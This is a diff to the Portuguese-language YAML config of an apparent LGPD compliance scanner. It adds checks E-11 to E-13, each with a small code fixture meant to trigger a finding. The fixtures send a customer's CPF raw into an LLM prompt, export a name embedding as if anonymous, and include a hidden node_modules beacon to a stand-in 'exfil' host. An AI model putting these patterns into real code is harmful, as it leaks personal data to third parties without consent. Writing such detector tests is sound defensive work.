@@ -579,3 +579,86 @@ checks:
           def decidir(modelo, x):
               return modelo.predict(x)
       espera_severidade: MEDIO
+
+  # --- IA e cadeia de terceiros (E-11..E-13) -------------------------------
+  # Ficam no pack `ethics` porque o prefixo do ID fixa o pack, e o ID foi
+  # ratificado como E-*. Na regra de fronteira do plano v1 (§2, "o check mora
+  # no submodulo cujo OBJETO ele examina") E-11 tenderia a privacy e E-13 a
+  # security; a coesao do prefixo venceu, e o `supports` abaixo registra o
+  # parentesco para que a sobreposicao seja referencia cruzada, nunca duplicacao.
+  # E-11 entra no conjunto CRITICO (fail-closed), ratificado no pedido.
+  E-11:
+    pack: ethics
+    titulo: PII em prompt de LLM sem redacao
+    base_legal: LGPD Art. 46 + Art. 42 (responsabilidade solidaria)
+    tipo: estatico
+    modo: inventory
+    fase: 4
+    status: implementado
+    supports: [P-01, S-04]
+    canonical_mutation:
+      descricao: dado pessoal interpolado cru em chamada a modelo de linguagem
+      arquivos:
+        a.py: |
+          import llm
+
+
+          def resumir(user):
+              # TODO: redact algum dia
+              return llm.complete(f"cliente {user.cpf} reclamou")
+      espera_severidade: CRITICO
+  E-12:
+    pack: ethics
+    titulo: Embedding/hash exportado como se fosse anonimo
+    base_legal: LGPD Art. 12 + Art. 42 (responsabilidade solidaria)
+    tipo: estatico
+    modo: inventory
+    fase: 4
+    status: implementado
+    supports: [P-04, S-05]
+    canonical_mutation:
+      descricao: derivado exportado com campo de origem ausente do catalogo
+      arquivos:
+        a.py: |
+          def indexar(u):
+              embedding_do_usuario = modelo.encode(u.nome_completo)
+              broker.send(embedding_do_usuario)
+        catalog.yaml: |
+          tables:
+            contratos:
+              fields:
+                valor:
+                  class: anonymized
+                  owner: financeiro
+                  purpose: relatorio
+                  legal_basis: contrato
+                  retention_years: 5
+      config:
+        catalog_path: catalog.yaml
+      espera_severidade: ALTO
+  E-13:
+    pack: ethics
+    titulo: Dependencia com host nao declarado no manifesto
+    base_legal: LGPD Art. 39 + Art. 42 (responsabilidade solidaria)
+    tipo: estatico
+    modo: inventory
+    fase: 4
+    status: implementado
+    supports: [S-04, S-08]
+    canonical_mutation:
+      descricao: host dentro de node_modules ausente do manifesto de terceiros
+      arquivos:
+        node_modules/rastreador/index.js: |
+          export function t(e) {
+            navigator.sendBeacon("https://telemetria.exfil.example.net/c", e);
+          }
+        tp.yml: |
+          integrations:
+            - name: outro
+              hosts: [api.outro.example.net]
+              dpa_signed: true
+              egress_fields: [id_pseudonimo]
+      config:
+        third_party_manifest: tp.yml
+      espera_severidade: ALTO
+
